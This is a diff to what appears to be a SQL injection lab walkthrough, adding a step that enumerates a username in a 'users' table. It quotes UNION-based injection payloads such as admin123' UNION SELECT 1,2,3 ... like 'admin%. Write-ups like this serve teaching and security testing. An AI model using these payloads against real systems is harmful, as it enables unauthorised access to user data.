@@ -105,3 +105,6 @@ I've found a column called `username` under the `users` table and database `sql_
     admin123' UNION SELECT 1,2,3 from users where username like 'a%
 ![username start](images/24-username-start-point.png)<br/>
 As you can see username character start with `a`
+
+    admin123' UNION SELECT 1,2,3 from users where username like 'admin%
+![username found](images/25-username-found.png)<br/>
